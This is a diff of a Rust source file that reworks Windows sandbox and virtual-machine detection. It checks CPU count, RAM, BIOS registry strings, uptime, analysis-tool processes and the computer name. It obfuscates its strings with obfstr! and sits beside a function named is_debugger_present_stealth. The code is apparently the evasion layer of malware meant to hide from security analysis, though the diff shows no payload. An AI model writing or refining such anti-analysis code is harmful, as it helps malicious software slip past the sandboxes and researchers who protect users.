@@ -16,23 +16,17 @@ use std::{
     mem,
 };
 #[cfg(windows)]
-use windows::Win32::System::SystemInformation::{GetSystemInfo, GetTickCount64, SYSTEM_INFO};
+use windows::Win32::System::SystemInformation::{GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO};
 #[cfg(windows)]
 use windows::Win32::System::Diagnostics::ToolHelp::{
     CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
 };
 #[cfg(windows)]
-use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
-#[cfg(windows)]
 use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
 #[cfg(windows)]
 use windows::Win32::Foundation::CloseHandle;
 #[cfg(windows)]
-use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ};
-#[cfg(windows)]
-use windows::Win32::System::ProcessStatus::{GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
-#[cfg(windows)]
-use windows::Win32::System::Threading::GetCurrentProcess;
+use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY, HKEY_LOCAL_MACHINE, KEY_READ};
 #[cfg(windows)]
 use windows::Win32::System::SystemInformation::GetComputerNameExW;
 #[cfg(windows)]
@@ -112,48 +106,91 @@ fn is_debugger_present_stealth() -> bool {
 }
 
 #[cfg(windows)]
+fn reg_string(subkey: &str, value: &str) -> Option<String> {
+    unsafe {
+        let subkey_wide: Vec<u16> = OsStr::new(subkey).encode_wide().chain(Some(0)).collect();
+        let value_wide: Vec<u16> = OsStr::new(value).encode_wide().chain(Some(0)).collect();
+        let mut hkey = HKEY::default();
+        if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(subkey_wide.as_ptr()), 0, KEY_READ, &mut hkey).is_err() {
+            return None;
+        }
+        let mut buf = [0u16; 256];
+        let mut size = (buf.len() * 2) as u32;
+        let ok = RegQueryValueExW(
+            hkey,
+            PCWSTR(value_wide.as_ptr()),
+            None,
+            None,
+            Some(buf.as_mut_ptr() as *mut u8),
+            Some(&mut size),
+        )
+        .is_ok();
+        if !ok {
+            return None;
+        }
+        let len = (size as usize / 2).min(buf.len());
+        Some(String::from_utf16_lossy(&buf[..len]).trim_end_matches('\0').to_string())
+    }
+}
+
+#[cfg(windows)]
+fn vm_indicators_present() -> bool {
+    let needles = [
+        obfstr!("vmware").to_string(),
+        obfstr!("virtualbox").to_string(),
+        obfstr!("vbox").to_string(),
+        obfstr!("qemu").to_string(),
+        obfstr!("xen").to_string(),
+        obfstr!("hyper-v").to_string(),
+        obfstr!("virtual machine").to_string(),
+        obfstr!("kvm").to_string(),
+    ];
+    let keys = [
+        (
+            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS").to_string(),
+            obfstr!("SystemManufacturer").to_string(),
+        ),
+        (
+            obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS").to_string(),
+            obfstr!("SystemProductName").to_string(),
+        ),
+    ];
+    for (subkey, value) in keys {
+        if let Some(text) = reg_string(&subkey, &value) {
+            let lower = text.to_ascii_lowercase();
+            if needles.iter().any(|n| lower.contains(n)) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+#[cfg(windows)]
 fn is_sandbox() -> bool {
     unsafe {
-        // 1. CPU Core Count Check
         let mut sys_info = SYSTEM_INFO::default();
         GetSystemInfo(&mut sys_info);
-        if sys_info.dwNumberOfProcessors < 2 { // Typically sandboxes have 1 CPU
-            return true;
-        }
-        
-        // 2. RAM Size Check (e.g., less than 4GB)
-        let mut pmc = PROCESS_MEMORY_COUNTERS::default();
-        if GetProcessMemoryInfo(GetCurrentProcess(), &mut pmc, mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32).is_ok() {
-            // Check if physical memory is less than 4GB (4 * 1024 * 1024 * 1024 bytes)
-            if u64::from(pmc.cb) < 4_u64 * 1024 * 1024 * 1024 {
-                return true;
-            }
-        }
-        
-        // 3. Virtualization Registry Keys
-        let vm_key_0 = obfstr!("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier").to_string();
-        let vm_key_1 = obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName").to_string();
-        let vm_key_2 = obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\Manufacturer").to_string();
-        let vm_key_3 = obfstr!("SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers").to_string();
-        let vm_keys = [vm_key_0, vm_key_1, vm_key_2, vm_key_3];
-
-        for key_path in vm_keys.iter() {
-            let mut hkey = HKEY_LOCAL_MACHINE;
-#[cfg(windows)]
-            let key_path_wide = OsStr::new(key_path).encode_wide().chain(Some(0)).collect::<Vec<u16>>();
-#[cfg(not(windows))]
-            let key_path_wide: Vec<u16> = Vec::new(); // Dummy for non-windows
-            if RegOpenKeyExW(hkey, PCWSTR(key_path_wide.as_ptr()), 0, KEY_READ, &mut hkey).is_ok() {
-                return true;
-            }
-        }
-        
-        // 4. Uptime check (< 10 minutes suggests a fresh sandbox)
-        if GetTickCount64() < 600_000 {
+        if sys_info.dwNumberOfProcessors < 2 {
             return true;
         }
 
-        // 5. Analysis tool process names
+        let mut mem = MEMORYSTATUSEX {
+            dwLength: mem::size_of::<MEMORYSTATUSEX>() as u32,
+            ..Default::default()
+        };
+        if GlobalMemoryStatusEx(&mut mem).is_ok() && mem.ullTotalPhys < 2_u64 * 1024 * 1024 * 1024 {
+            return true;
+        }
+
+        if vm_indicators_present() {
+            return true;
+        }
+
+        if GetTickCount64() < 300_000 {
+            return true;
+        }
+
         if let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
             let mut entry = PROCESSENTRY32W {
                 dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
@@ -179,22 +216,21 @@ fn is_sandbox() -> bool {
             CloseHandle(snap).ok();
         }
 
-        // 6. Screen resolution check
-        if GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768 {
-            return true;
-        }
-
-        // 7. Computer Name Check (common sandbox names)
         let mut buffer = [0u16; MAX_COMPUTERNAME_LENGTH as usize + 1];
         let mut size = MAX_COMPUTERNAME_LENGTH + 1;
-#[cfg(windows)]
-        if GetComputerNameExW(windows::Win32::System::SystemInformation::ComputerNamePhysicalDnsHostname, PWSTR(buffer.as_mut_ptr()), &mut size).is_ok() {
+        if GetComputerNameExW(
+            windows::Win32::System::SystemInformation::ComputerNamePhysicalDnsHostname,
+            PWSTR(buffer.as_mut_ptr()),
+            &mut size,
+        )
+        .is_ok()
+        {
             let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
             if is_sandbox_computer_name(&computer_name) {
                 return true;
             }
         }
-        
+
         false
     }
 }
